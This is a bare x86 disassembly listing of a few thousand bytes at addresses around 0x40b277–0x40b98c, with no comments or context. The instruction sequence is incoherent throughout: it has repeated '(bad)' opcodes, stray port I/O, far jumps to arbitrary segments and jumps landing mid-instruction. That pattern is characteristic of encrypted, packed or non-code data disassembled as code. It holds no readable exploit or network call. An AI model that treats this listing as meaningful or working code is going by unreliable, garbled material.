  40b277:	mov    al,0xc6
  40b279:	mov    ch,dh
  40b27b:	mov    edx,0xd72bc71d
  40b280:	push   cs
  40b281:	cs pop edi
  40b283:	mov    eax,ds:0x2352f751
  40b288:	inc    esp
  40b289:	xchg   esi,eax
  40b28a:	dec    esi
  40b28b:	xor    al,0x5e
  40b28d:	fmul   st,st(3)
  40b28f:	or     DWORD PTR [ecx],ebx
  40b291:	cmp    ebx,DWORD PTR [ebp+0x656160fe]
  40b297:	stc    
  40b298:	xor    BYTE PTR [eax-0x21],bh
  40b29b:	adc    ebx,0x5be5863c
  40b2a1:	mov    ecx,0x3ebdce6
  40b2a6:	dec    esi
  40b2a7:	not    esi
  40b2a9:	and    dl,BYTE PTR [edi]
  40b2ab:	add    DWORD PTR [edx+0x74],ebp
  40b2ae:	int3   
  40b2af:	sbb    edx,DWORD PTR [ebp-0xd7f118e]
  40b2b5:	mov    ah,0x87
  40b2b7:	jle    0x40b30f
  40b2b9:	xor    BYTE PTR [ecx+0x75],ch
  40b2bc:	adc    esi,DWORD PTR [edx+0x52e9c0ce]
  40b2c2:	inc    esi
  40b2c3:	ret    0x8eca
  40b2c6:	cs jne 0x40b312
  40b2c9:	add    DWORD PTR [ebx+0x77],esp
  40b2cc:	pop    esi
  40b2cd:	cmc    
  40b2ce:	xchg   esp,eax
  40b2cf:	in     al,dx
  40b2d0:	mov    ch,0xda
  40b2d2:	out    dx,eax
  40b2d3:	aad    0x7
  40b2d5:	adc    eax,0xbe5ed225
  40b2da:	push   esp
  40b2db:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b2dc:	and    BYTE PTR [ecx],0x17
  40b2df:	pop    ss
  40b2e0:	pop    esi
  40b2e1:	pushf  
  40b2e2:	or     al,0xdb
  40b2e4:	jbe    0x40b2a1
  40b2e6:	jne    0x40b35f
  40b2e8:	in     al,0x60
  40b2ea:	push   ds
  40b2eb:	test   BYTE PTR [eax],bl
  40b2ed:	in     eax,dx
  40b2ee:	cmp    esp,DWORD PTR [ebx]
  40b2f0:	fs sbb esi,ebp
  40b2f3:	dec    edi
  40b2f4:	clc    
  40b2f5:	aad    0x99
  40b2f7:	stos   BYTE PTR es:[edi],al
  40b2f8:	cld    
  40b2f9:	add    bh,BYTE PTR [eax-0x3b]
  40b2fc:	adc    BYTE PTR [ebx+eax*4],dh
  40b2ff:	mov    eax,ds:0xc592749f
  40b304:	add    BYTE PTR [ecx-0x12],0x7f
  40b308:	stos   BYTE PTR es:[edi],al
  40b309:	mov    WORD PTR [eax+0x4e],gs
  40b30c:	das    
  40b30d:	xchg   esp,eax
  40b30e:	xchg   esi,eax
  40b30f:	mov    eax,ds:0x307a521
  40b314:	js     0x40b29d
  40b316:	lea    ebx,[eax]
  40b318:	pop    esi
  40b319:	xchg   esi,eax
  40b31a:	inc    ebx
  40b31b:	das    
  40b31c:	push   0xb5583b2f
  40b321:	pop    edi
  40b322:	xchg   esp,eax
  40b323:	sub    DWORD PTR [edi+eax*8-0x36],edi
  40b327:	arpl   dx,si
  40b329:	inc    eax
  40b32a:	ja     0x40b2b6
  40b32c:	addr16 call 0x94c3:0x60bf526d
  40b334:	popa   
  40b335:	jns    0x40b322
  40b337:	cdq    
  40b338:	cs xor eax,0x425ef3ef
  40b33e:	mov    cl,0x68
  40b340:	or     eax,DWORD PTR [ecx]
  40b342:	out    dx,eax
  40b343:	in     al,0x4f
  40b345:	mov    WORD PTR [ebx-0x24],ds
  40b348:	clc    
  40b349:	int    0xe6
  40b34b:	repz int3 
  40b34d:	pop    edi
  40b34e:	pop    esp
  40b34f:	(bad)  
  40b350:	popa   
  40b351:	push   esi
  40b352:	inc    edx
  40b353:	ins    BYTE PTR es:[edi],dx
  40b354:	mov    al,0xa8
  40b356:	and    eax,0xeeeaea7a
  40b35b:	mov    DWORD PTR [ecx+0x654276c3],edx
  40b361:	sub    eax,0xac88a158
  40b366:	dec    edi
  40b367:	dec    esp
  40b368:	xchg   esp,eax
  40b369:	retf   0xba66
  40b36c:	fsubr  DWORD PTR fs:[esi+0x1e0140e2]
  40b373:	or     BYTE PTR [esi-0x6c5f276a],dh
  40b379:	cmp    BYTE PTR [esi+edx*4-0x5422f3f5],ah
  40b380:	pop    esi
  40b381:	aam    0x8
  40b383:	sbb    BYTE PTR [eax],cl
  40b385:	mov    ebx,DWORD PTR [edi]
  40b387:	pop    ss
  40b388:	xchg   edi,eax
  40b389:	pop    ebp
  40b38a:	add    BYTE PTR [ebx+edx*8],0x8e
  40b38e:	mov    WORD PTR [ecx],gs
  40b390:	lea    ebx,[ebx]
  40b392:	add    ebx,DWORD PTR [ecx-0x6d]
  40b395:	rcr    dh,0x25
  40b398:	pop    esi
  40b399:	mov    ch,ch
  40b39b:	test   al,0xad
  40b39d:	push   edx
  40b39e:	in     eax,0x77
  40b3a0:	call   0x724a3c05
  40b3a5:	or     al,BYTE PTR [eax+esi*4-0x36]
  40b3a9:	add    al,0x12
  40b3ab:	mov    bl,0x1b
  40b3ad:	and    ch,dh
  40b3af:	or     eax,DWORD PTR [edi+ebp*8+0x41c88a34]
  40b3b6:	fsub   QWORD PTR [ebx]
  40b3b8:	test   eax,esp
  40b3ba:	repz enter 0x48eb,0x11
  40b3bf:	ret    0xfb5e
  40b3c2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b3c3:	into   
  40b3c4:	inc    edi
  40b3c5:	mul    BYTE PTR [esi+0x76612d8b]
  40b3cb:	pop    edx
  40b3cc:	loopne 0x40b3f0
  40b3ce:	fmulp  st(3),st
  40b3d0:	jg     0x40b368
  40b3d2:	fnstenv [esi-0x158b07a2]
  40b3d8:	cmp    eax,0x4d0b4820
  40b3dd:	inc    ebx
  40b3de:	idiv   ecx
  40b3e0:	repz sbb DWORD PTR [ecx+0x24c10f82],edx
  40b3e7:	push   ebp
  40b3e8:	add    al,0x1d
  40b3ea:	out    dx,al
  40b3eb:	jae    0x40b3fd
  40b3ed:	(bad)  
  40b3ee:	bound  esp,QWORD PTR [ebx-0x5f1d2f56]
  40b3f4:	jp     0x40b3a5
  40b3f6:	mov    ?,WORD PTR [esi+0x2d]
  40b3f9:	inc    ecx
  40b3fa:	cvtdq2ps xmm0,XMMWORD PTR es:[ecx-0x6cdd9058]
  40b402:	fisttp DWORD PTR [esi+ecx*1]
  40b405:	shr    DWORD PTR [ecx+0x72],1
  40b408:	jp     0x40b46a
  40b40a:	push   eax
  40b40b:	ss stc 
  40b40d:	lahf   
  40b40e:	outs   dx,DWORD PTR ds:[esi]
  40b40f:	sbb    BYTE PTR [edx-0x65],cl
  40b412:	in     eax,dx
  40b413:	fdivr  DWORD PTR [esi-0x2d2af2e2]
  40b419:	iret   
  40b41a:	scas   al,BYTE PTR es:[edi]
  40b41b:	push   ebp
  40b41c:	inc    ebp
  40b41d:	jae    0x40b3b8
  40b41f:	mov    eax,ds:0x5c598d3f
  40b424:	shl    DWORD PTR [esi+esi*4],0x89
  40b428:	pop    esi
  40b429:	je     0x40b48b
  40b42b:	(bad)  
  40b42c:	gs cwde 
  40b42e:	lods   al,BYTE PTR ds:[esi]
  40b42f:	and    BYTE PTR [edi+0x4d],bl
  40b432:	outs   dx,DWORD PTR ds:[esi]
  40b433:	gs inc edx
  40b435:	mov    ebp,esi
  40b437:	lock xchg ebp,eax
  40b439:	arpl   bp,cx
  40b43b:	mov    ch,0x82
  40b43d:	(bad)  
  40b43e:	jmp    0x40b435
  40b440:	adc    eax,0x75711dc
  40b445:	shl    ecx,1
  40b447:	pop    ecx
  40b448:	inc    ebx
  40b449:	inc    edx
  40b44a:	lea    ecx,[ebp+0x4ad0524e]
  40b450:	xor    DWORD PTR [edi],edx
  40b452:	test   BYTE PTR [ebx-0x7a],ch
  40b455:	(bad)  
  40b456:	out    dx,al
  40b457:	shl    bh,cl
  40b459:	push   0xffffff99
  40b45b:	adc    al,0xd4
  40b45d:	aas    
  40b45e:	out    dx,al
  40b45f:	mov    ecx,0xfccaf477
  40b464:	in     eax,0xd4
  40b466:	jbe    0x40b409
  40b468:	ds stos DWORD PTR es:[edi],eax
  40b46a:	out    0xf5,al
  40b46c:	pop    edx
  40b46d:	in     al,dx
  40b46e:	xchg   esi,eax
  40b46f:	fstp   DWORD PTR [esi-0x2d]
  40b472:	sbb    al,0x7
  40b474:	cmc    
  40b475:	push   edi
  40b476:	dec    eax
  40b477:	jb     0x40b4b6
  40b479:	popa   
  40b47a:	jne    0x40b4ac
  40b47c:	scas   al,BYTE PTR es:[edi]
  40b47d:	js     0x40b402
  40b47f:	sbb    ecx,DWORD PTR [edi+0x67]
  40b482:	jmp    0x40b4a5
  40b484:	test   BYTE PTR ss:[edx-0x3d],cl
  40b488:	mov    ?,WORD PTR [eax+0x60dbf3d7]
  40b48e:	push   ds
  40b48f:	outs   dx,BYTE PTR ds:[esi]
  40b490:	fst    DWORD PTR [edx]
  40b492:	shl    DWORD PTR [ecx-0x28],0x3d
  40b496:	and    ebp,ebx
  40b498:	push   0xac330361
  40b49d:	mov    dl,BYTE PTR ds:0xfb610f67
  40b4a3:	fidiv  WORD PTR [edx+0x41]
  40b4a6:	add    DWORD PTR [esi],edx
  40b4a8:	inc    ecx
  40b4a9:	sbb    al,0xeb
  40b4ab:	lahf   
  40b4ac:	add    eax,0xd78f25a0
  40b4b1:	xchg   ebp,eax
  40b4b2:	int3   
  40b4b3:	jo     0x40b4f8
  40b4b5:	xor    ecx,ebx
  40b4b7:	hlt    
  40b4b8:	punpcklwd mm0,DWORD PTR [ecx-0x17]
  40b4bc:	push   ss
  40b4bd:	jnp    0x40b492
  40b4bf:	jo     0x40b47a
  40b4c1:	test   DWORD PTR [esi+eax*8],esp
  40b4c4:	icebp  
  40b4c5:	xlat   BYTE PTR ds:[ebx]
  40b4c6:	mov    edi,0x5bc0c68e
  40b4cb:	push   esi
  40b4cc:	rol    BYTE PTR [ecx-0x16],0xf
  40b4d0:	dec    ebx
  40b4d1:	mov    eax,ds:0xccf2cca1
  40b4d6:	nop
  40b4d7:	xor    dl,BYTE PTR [ebx-0x43]
  40b4da:	xor    esp,ebp
  40b4dc:	adc    al,bh
  40b4de:	out    dx,al
  40b4df:	mov    bh,0x93
  40b4e1:	xchg   BYTE PTR [esi-0x7c],bl
  40b4e4:	popf   
  40b4e5:	inc    ebx
  40b4e6:	mov    eax,0x93213595
  40b4eb:	repnz or ebx,edi
  40b4ee:	jmp    0x40b52a
  40b4f0:	pop    esi
  40b4f1:	jns    0x40b4a8
  40b4f3:	jae    0x40b546
  40b4f5:	pop    edi
  40b4f6:	push   esi
  40b4f7:	sub    esp,DWORD PTR [edi+0x58]
  40b4fa:	es iret 
  40b4fc:	(bad)  
  40b4fd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b4fe:	loope  0x40b523
  40b500:	cdq    
  40b501:	or     al,0x93
  40b503:	mov    eax,ds:0x764ef054
  40b508:	sbb    al,0xe2
  40b50a:	pop    es
  40b50b:	scas   al,BYTE PTR es:[edi]
  40b50c:	push   edx
  40b50d:	lods   eax,DWORD PTR ds:[esi]
  40b50e:	and    ebx,DWORD PTR [ecx-0x52bddae2]
  40b514:	lods   al,BYTE PTR ds:[esi]
  40b515:	jle    0x40b4fd
  40b517:	mov    al,ds:0xdcc85f03
  40b51c:	mov    dl,0x1d
  40b51e:	xor    eax,0x19b154ba
  40b523:	sti    
  40b524:	push   ds
  40b525:	mov    bh,0x23
  40b527:	sbb    eax,0xa0ed3935
  40b52c:	mov    cs,WORD PTR [ecx+0x6f]
  40b52f:	pop    eax
  40b530:	inc    esi
  40b531:	popf   
  40b532:	dec    esi
  40b533:	cmp    ah,BYTE PTR [ebx-0x34]
  40b536:	inc    ebp
  40b537:	dec    ecx
  40b538:	and    cl,ah
  40b53a:	out    0x6f,eax
  40b53c:	sbb    edx,eax
  40b53e:	jne    0x40b4e0
  40b540:	and    ebx,DWORD PTR [esi]
  40b542:	jle    0x40b507
  40b544:	sahf   
  40b545:	and    eax,0x865db1cb
  40b54a:	in     al,dx
  40b54b:	rcr    DWORD PTR [edx+0x79289a28],1
  40b551:	sar    BYTE PTR [edx-0x769f2e97],0x54
  40b558:	pop    edi
  40b559:	push   esp
  40b55a:	add    DWORD PTR [ecx+ebx*1],edi
  40b55d:	mov    eax,0x3516e0ee
  40b562:	sub    ch,dl
  40b564:	pop    ss
  40b565:	xchg   BYTE PTR [eax-0x58],dl
  40b568:	outs   dx,DWORD PTR ds:[esi]
  40b569:	jae    0x40b52a
  40b56b:	retf   0x89bd
  40b56e:	jns    0x40b542
  40b570:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b571:	adc    BYTE PTR [edi],dh
  40b573:	jns    0x40b533
  40b575:	jl     0x40b565
  40b577:	test   BYTE PTR [ebx+ecx*1+0x65],ch
  40b57b:	cmp    al,0xab
  40b57d:	(bad)  
  40b57f:	mov    eax,ds:0xc28be34b
  40b584:	(bad)  
  40b585:	cli    
  40b586:	push   eax
  40b587:	mov    edx,0x67c7885e
  40b58c:	mov    eax,ds:0x3609a4d7
  40b591:	sub    al,0xb2
  40b593:	mov    al,ds:0x1d193d53
  40b598:	xchg   DWORD PTR [ebx],esp
  40b59a:	jge    0x40b5d0
  40b59c:	push   ebx
  40b59d:	or     ecx,0x8c30de26
  40b5a3:	cmc    
  40b5a4:	das    
  40b5a5:	loope  0x40b56b
  40b5a7:	mov    al,ds:0x2dd9b39f
  40b5ac:	add    BYTE PTR [edx],cl
  40b5ae:	cmp    eax,0xf36a5e1d
  40b5b3:	mov    ecx,0x5a9f2f22
  40b5b8:	ins    DWORD PTR es:[edi],dx
  40b5b9:	sub    dl,bl
  40b5bb:	mov    al,ds:0xe5304f7d
  40b5c0:	sbb    eax,ebx
  40b5c2:	jl     0x40b552
  40b5c4:	pop    esi
  40b5c5:	retf   0x3da4
  40b5c8:	pop    esp
  40b5c9:	xchg   ecx,eax
  40b5ca:	adc    eax,0x38612598
  40b5cf:	pop    ss
  40b5d0:	fistp  DWORD PTR [edx+0x3eea43dd]
  40b5d6:	out    dx,al
  40b5d7:	into   
  40b5d8:	lahf   
  40b5d9:	popa   
  40b5da:	call   FWORD PTR [eax+0x31]
  40b5dd:	in     al,dx
  40b5de:	test   eax,0x9608d1a1
  40b5e3:	and    bh,bl
  40b5e5:	adc    ah,ch
  40b5e7:	loopne 0x40b593
  40b5e9:	jns    0x40b5b9
  40b5eb:	jp     0x40b64b
  40b5ed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b5ee:	stc    
  40b5ef:	jle    0x40b634
  40b5f1:	clc    
  40b5f2:	inc    ecx
  40b5f3:	adc    BYTE PTR [esi],0x61
  40b5f6:	sub    eax,DWORD PTR [edi-0xb]
  40b5f9:	retf   
  40b5fa:	enter  0x11e4,0x16
  40b5fe:	and    BYTE PTR [edi-0x5e352cf5],bh
  40b604:	cmp    eax,0xc4b64a61
  40b609:	mov    esi,0x1dbba0fc
  40b60e:	rcl    BYTE PTR [edx],0x74
  40b611:	fistp  DWORD PTR [esi-0x8c9b02]
  40b617:	ins    BYTE PTR es:[edi],dx
  40b618:	adc    BYTE PTR [ebx],ah
  40b61a:	outs   dx,DWORD PTR ds:[esi]
  40b61b:	xchg   edi,eax
  40b61c:	pop    edx
  40b61d:	inc    ecx
  40b61e:	in     eax,dx
  40b61f:	ja     0x40b65a
  40b621:	(bad)  
  40b622:	jo     0x40b5d4
  40b624:	sub    BYTE PTR [ecx+0x6e],dh
  40b627:	das    
  40b628:	fdiv   QWORD PTR [edx+edx*2]
  40b62b:	shr    BYTE PTR [ecx-0x19c31243],cl
  40b631:	fs aas 
  40b633:	xor    eax,0xce52e05b
  40b638:	xlat   BYTE PTR ds:[ebx]
  40b639:	pusha  
  40b63a:	mov    bh,BYTE PTR [ecx-0x560cbc2d]
  40b640:	mov    ds:0xaf7beeae,eax
  40b645:	mov    eax,ds:0x235a796c
  40b64a:	mov    ebp,0xad350c8e
  40b64f:	cs pop esi
  40b651:	sub    bl,bh
  40b653:	or     bl,ch
  40b655:	mov    dl,0xcb
  40b657:	pop    ecx
  40b658:	push   edx
  40b659:	leave  
  40b65a:	pop    edi
  40b65b:	mov    eax,0x3d54119b
  40b660:	jne    0x40b6c2
  40b662:	leave  
  40b663:	out    0xd0,al
  40b665:	(bad)  
  40b666:	out    dx,eax
  40b667:	mov    al,ds:0xeaf0883c
  40b66c:	in     al,dx
  40b66d:	adc    DWORD PTR [ebp+0x65],0x60
  40b671:	loop   0x40b5fe
  40b673:	sbb    edi,ebx
  40b675:	add    al,0x7c
  40b677:	(bad)  
  40b678:	fidivr WORD PTR [esi+ebx*8+0xf61159c]
  40b67f:	(bad)
  40b683:	mov    cl,0xd4
  40b685:	std    
  40b686:	out    dx,al
  40b687:	mov    bl,0xf5
  40b689:	sub    DWORD PTR [edx-0x67],0xffffffc7
  40b68d:	xchg   esi,eax
  40b68e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b68f:	mov    eax,ds:0xa5d25a1a
  40b694:	dec    ebx
  40b695:	jno    0x40b716
  40b697:	add    bl,BYTE PTR [esi-0x20]
  40b69a:	popa   
  40b69b:	push   ecx
  40b69c:	scas   eax,DWORD PTR es:[edi]
  40b69d:	out    dx,eax
  40b69e:	jno    0x40b628
  40b6a0:	out    0x63,eax
  40b6a2:	test   ch,ch
  40b6a4:	adc    BYTE PTR [bx+di+0x71],bh
  40b6a8:	pop    esi
  40b6a9:	les    edx,FWORD PTR [ecx+edi*2]
  40b6ac:	(bad)  
  40b6ad:	mov    ebp,0x6e5e0a56
  40b6b2:	call   0xc8bd8431
  40b6b7:	jno    0x40b6bc
  40b6b9:	fs cmp al,0xd5
  40b6bc:	fbld   TBYTE PTR [esi]
  40b6be:	pop    ds
  40b6bf:	rcl    BYTE PTR [esi],1
  40b6c1:	mov    eax,ds:0xa3d04a9e
  40b6c6:	adc    al,bl
  40b6c8:	pop    ecx
  40b6c9:	or     dh,ch
  40b6cb:	fwait
  40b6cc:	in     al,0xfb
  40b6ce:	mov    ebx,0x5a613c4c
  40b6d3:	scas   al,BYTE PTR es:[edi]
  40b6d4:	icebp  
  40b6d5:	in     eax,dx
  40b6d6:	cwde   
  40b6d7:	adc    DWORD PTR [edi+0x4d],edi
  40b6da:	and    al,0x16
  40b6dc:	lea    esp,[eax-0xf]
  40b6df:	and    ch,BYTE PTR [eax+0x62]
  40b6e2:	adc    al,0x4c
  40b6e4:	clc    
  40b6e5:	pusha  
  40b6e6:	sbb    dl,BYTE PTR cs:[ecx]
  40b6e9:	sub    al,0x8e
  40b6eb:	addr16 (bad) 
  40b6ed:	fucomip st,st(6)
  40b6ef:	pop    esp
  40b6f0:	xchg   ebx,eax
  40b6f1:	cmp    DWORD PTR fs:[eax],eax
  40b6f4:	fs jbe 0x40b728
  40b6f7:	mov    eax,ds:0x57b2f9a0
  40b6fc:	outs   dx,DWORD PTR ds:[esi]
  40b6fd:	push   ebp
  40b6fe:	retf   
  40b6ff:	push   cs
  40b700:	(bad)  
  40b701:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b702:	cld    
  40b703:	pop    eax
  40b704:	jge    0x40b6f1
  40b706:	out    dx,al
  40b707:	cmp    edi,ebp
  40b709:	jge    0x40b735
  40b70b:	xlat   BYTE PTR ds:[ebx]
  40b70c:	cld    
  40b70d:	pusha  
  40b70e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b70f:	pop    ss
  40b710:	pop    es
  40b711:	loope  0x40b769
  40b713:	adc    al,0x83
  40b715:	imul   dh
  40b717:	ret    0x994
  40b71a:	out    dx,eax
  40b71b:	ss gs xchg esi,eax
  40b71e:	hlt    
  40b71f:	sub    BYTE PTR [esi-0x42cef9ae],ch
  40b725:	add    ecx,esi
  40b727:	push   es
  40b728:	mov    DWORD PTR [eax],ecx
  40b72a:	sub    DWORD PTR [esi+ebx*2],ecx
  40b72d:	out    dx,eax
  40b72e:	mov    al,BYTE PTR [esi+0xb]
  40b731:	imul   esp,DWORD PTR [esi+0x126001da],0x39780dc
  40b73b:	loop   0x40b768
  40b73d:	inc    ecx
  40b73e:	push   esi
  40b73f:	mov    dh,0x54
  40b741:	pop    esp
  40b742:	ds addr16 sahf 
  40b745:	jge    0x40b7a5
  40b747:	jmp    0x2a51:0x9f07cb63
  40b74e:	mov    bl,0x7c
  40b750:	add    DWORD PTR ds:[ecx],ebx
  40b753:	mov    ecx,0xbbefa8fe
  40b758:	(bad)  
  40b759:	pop    eax
  40b75a:	jbe    0x40b71d
  40b75c:	mov    esp,0x1e49b105
  40b761:	icebp  
  40b762:	xchg   edx,eax
  40b763:	mov    eax,ds:0xa6e06553
  40b768:	shr    dl,1
  40b76a:	int3   
  40b76b:	ret    0x30eb
  40b76e:	in     eax,dx
  40b76f:	xor    al,0xef
  40b771:	or     al,0x4
  40b773:	xchg   ebx,eax
  40b774:	cmp    al,0x45
  40b776:	dec    ecx
  40b777:	cmp    al,0x9f
  40b779:	sti    
  40b77a:	out    dx,al
  40b77b:	pop    ss
  40b77c:	mov    dl,0xf2
  40b77e:	sbb    ebp,ebx
  40b780:	das    
  40b781:	pop    esi
  40b782:	mov    fs,WORD PTR [ebx]
  40b784:	xor    al,0xa0
  40b786:	cmp    al,0xeb
  40b788:	jle    0x40b750
  40b78a:	lea    ecx,[ecx+0x5e]
  40b78d:	test   DWORD PTR [eax-0x1f],0xbb233bee
  40b794:	mov    cl,0x44
  40b796:	xchg   edx,eax
  40b797:	test   edi,ebx
  40b799:	and    BYTE PTR [ebx-0x66852822],ah
  40b79f:	sbb    al,0x52
  40b7a1:	int    0xc
  40b7a3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b7a4:	arpl   WORD PTR [eax+0x175080f4],ax
  40b7aa:	imul   DWORD PTR [eax+eiz*4+0xea12f2a]
  40b7b1:	je     0x40b7b0
  40b7b3:	and    cl,ch
  40b7b5:	pop    ebp
  40b7b6:	les    edx,FWORD PTR [esi]
  40b7b8:	aaa    
  40b7b9:	sub    eax,0x82e20e9
  40b7be:	push   ebx
  40b7bf:	mov    ebx,0xa0202f80
  40b7c4:	inc    edi
  40b7c5:	jg     0x40b787
  40b7c7:	(bad)  
  40b7c8:	dec    BYTE PTR [eax]
  40b7ca:	push   ebp
  40b7cb:	inc    ecx
  40b7cc:	mov    ch,0xa
  40b7ce:	out    dx,al
  40b7cf:	es mov eax,ss
  40b7d2:	xor    eax,eax
  40b7d4:	js     0x40b7d5
  40b7d6:	push   0xffffffa4
  40b7d8:	sub    ecx,esp
  40b7da:	loope  0x40b7b0
  40b7dc:	adc    ebx,DWORD PTR [edx+0x46]
  40b7df:	retf   
  40b7e0:	dec    ecx
  40b7e1:	pop    edi
  40b7e2:	lock mov eax,DWORD PTR [eax+esi*4-0x4d]
  40b7e7:	pop    ebx
  40b7e8:	fs loope 0x40b7ca
  40b7eb:	and    DWORD PTR [ebx+0x9a106dc],esi
  40b7f1:	fwait
  40b7f2:	mov    bl,ch
  40b7f4:	ds mov eax,gs
  40b7f7:	ficomp WORD PTR [esi+0x11]
  40b7fa:	push   esi
  40b7fb:	xchg   ebp,eax
  40b7fc:	stos   BYTE PTR es:[edi],al
  40b7fd:	fimul  DWORD PTR cs:[esi+ebx*4-0x56]
  40b802:	jmp    0x97aa:0xa6e0c6a0
  40b809:	arpl   WORD PTR [ebx+0x47],di
  40b80c:	addr16 out 0xb,eax
  40b80f:	pop    ecx
  40b810:	hlt    
  40b811:	pop    ecx
  40b812:	xor    DWORD PTR [edi+0x4e],0xffffff8e
  40b816:	sbb    al,0xaf
  40b818:	shl    DWORD PTR [eax-0x55],1
  40b81b:	pop    edx
  40b81c:	jb     0x40b848
  40b81e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b81f:	lods   eax,DWORD PTR ds:[esi]
  40b820:	(bad)  
  40b821:	in     eax,dx
  40b822:	dec    esi
  40b823:	xchg   ebx,eax
  40b824:	pop    esi
  40b825:	sub    DWORD PTR [ebp+edi*4+0x497c65c1],esi
  40b82c:	pop    es
  40b82d:	popa   
  40b82e:	adc    DWORD PTR [eax],0x95ed332f
  40b834:	jo     0x40b8ae
  40b836:	out    dx,al
  40b837:	add    eax,0x290b5751
  40b83c:	lahf   
  40b83d:	push   esp
  40b83e:	pop    es
  40b83f:	mov    ds:0x32a9875c,eax
  40b844:	aad    0xa0
  40b846:	scas   al,BYTE PTR es:[edi]
  40b847:	loop   0x40b805
  40b849:	je     0x40b839
  40b84b:	imul   edx,DWORD PTR [edx],0xfffffff9
  40b84e:	neg    edx
  40b850:	pop    ebp
  40b851:	pop    ds
  40b852:	out    0xa0,eax
  40b854:	je     0x40b8be
  40b856:	pop    ds
  40b857:	sbb    DWORD PTR ds:0x5e061b4b,edi
  40b85d:	(bad)  
  40b85e:	hlt    
  40b85f:	sub    eax,edi
  40b861:	test   DWORD PTR [edx],ebx
  40b863:	(bad)  
  40b864:	jns    0x40b8c6
  40b866:	test   DWORD PTR [edx-0x64],ebx
  40b869:	mov    ds:0xbddb6c79,eax
  40b86e:	out    dx,al
  40b86f:	mov    eax,0x1c5a5bb2
  40b874:	hlt    
  40b875:	add    eax,0x13f3bcc1
  40b87a:	mov    al,0xa0
  40b87c:	mov    ebx,0xe9f6b70e
  40b881:	popa   
  40b882:	out    dx,al
  40b883:	dec    ebx
  40b884:	shr    BYTE PTR [ebx-0x8],cl
  40b887:	xor    DWORD PTR [edx],ecx
  40b889:	repz jae 0x40b82d
  40b88c:	mov    esp,0x817279b5
  40b891:	lea    ebp,es:[edx]
  40b894:	pop    esi
  40b895:	mov    ds:0xa6096336,al
  40b89a:	and    DWORD PTR [esi+0x78],esi
  40b89d:	pusha  
  40b89e:	add    al,0x61
  40b8a0:	sbb    DWORD PTR [eax+edi*2+0x48],0xffffff95
  40b8a5:	fldz   
  40b8a7:	mov    eax,ds:0xfe44634b
  40b8ac:	mov    ds:0xd3f5e69e,al
  40b8b1:	pusha  
  40b8b2:	or     al,0x74
  40b8b4:	aad    0x0
  40b8b6:	dec    edi
  40b8b7:	loopne 0x40b922
  40b8b9:	icebp  
  40b8ba:	out    dx,eax
  40b8bb:	test   DWORD PTR [edi-0x2c],0xfd09c0d0
  40b8c2:	loopne 0x40b8a9
  40b8c4:	mov    fs,WORD PTR [eax+0x3a]
  40b8c7:	mov    ch,0xda
  40b8c9:	mov    ebp,0xfdc523ae
  40b8ce:	pop    esp
  40b8cf:	xor    bl,BYTE PTR [eax+eax*1+0x45]
  40b8d3:	and    DWORD PTR [ecx+0x16a20c1e],ecx
  40b8d9:	adc    edx,ebp
  40b8db:	(bad)  [ecx]
  40b8dd:	stos   DWORD PTR es:[edi],eax
  40b8de:	fwait
  40b8df:	and    DWORD PTR [edx+eax*4+0xb],ebp
  40b8e3:	mov    al,0xc1
  40b8e5:	inc    esi
  40b8e6:	je     0x40b898
  40b8e8:	add    BYTE PTR [edi+0x6e],0x21
  40b8ec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b8ed:	jae    0x40b938
  40b8ef:	ins    DWORD PTR es:[edi],dx
  40b8f0:	xor    eax,0x2d230040
  40b8f5:	jmp    0x40b965
  40b8f7:	xchg   esp,eax
  40b8f8:	(bad)  
  40b8f9:	push   ds
  40b8fa:	into   
  40b8fb:	sbb    al,0xa1
  40b8fd:	mov    ah,0x8e
  40b8ff:	mov    eax,ds:0x9d7f482b
  40b904:	inc    eax
  40b905:	stos   DWORD PTR es:[edi],eax
  40b906:	or     eax,esp
  40b908:	pop    esi
  40b909:	fistp  DWORD PTR [ebx+0x78]
  40b90c:	xor    al,0xff
  40b90e:	pop    edi
  40b90f:	xchg   ebx,eax
  40b910:	or     al,0x2d
  40b912:	jbe    0x40b8bc
  40b914:	fidivr WORD PTR [esp+eiz*2-0xf]
  40b918:	sub    DWORD PTR [ecx-0x52],edx
  40b91b:	out    dx,al
  40b91c:	inc    ebp
  40b91d:	ds jmp 0x40b99e
  40b920:	mov    DWORD PTR [edx-0x6e],0x66c0c36c
  40b927:	std    
  40b928:	cmc    
  40b929:	pusha  
  40b92a:	sbb    eax,0x2f45a167
  40b92f:	push   cs
  40b930:	rcl    DWORD PTR [eax],0xee
  40b933:	inc    ecx
  40b934:	fidivr WORD PTR [edi-0x22953266]
  40b93a:	pop    ebx
  40b93b:	xchg   esp,eax
  40b93c:	stos   DWORD PTR es:[edi],eax
  40b93d:	sar    BYTE PTR [eax-0x7a8b859],0x20
  40b944:	xchg   DWORD PTR [ebx],ecx
  40b946:	push   esi
  40b947:	xchg   DWORD PTR [esi+0x50],ebx
  40b94a:	mov    dh,0x43
  40b94c:	xchg   edx,eax
  40b94d:	mov    bl,0x98
  40b94f:	fisttp DWORD PTR [eax]
  40b951:	pusha  
  40b952:	cmp    al,0xe3
  40b954:	and    cl,BYTE PTR [ecx-0x5f742130]
  40b95a:	cmp    ecx,DWORD PTR [ecx]
  40b95c:	pop    esi
  40b95d:	inc    ebx
  40b95e:	mov    ch,BYTE PTR [edi+eax*8+0x4b]
  40b962:	(bad)  
  40b963:	in     eax,dx
  40b964:	xchg   esp,eax
  40b965:	addr16 call 0xe70a:0xedfc3868
  40b96d:	sub    eax,0x218fc94f
  40b972:	dec    esi
  40b973:	pop    ss
  40b974:	push   ecx
  40b975:	pop    esi
  40b976:	loop   0x40b9f5
  40b978:	and    eax,0x54963266
  40b97d:	sub    esp,esp
  40b97f:	sbb    al,0x5e
  40b981:	imul   edi,DWORD PTR [esi+0x42],0xa199c629
  40b988:	nop
  40b989:	xchg   DWORD PTR [esi+ebx*8],eax
  40b98c:	jmp    0x5d4f216d
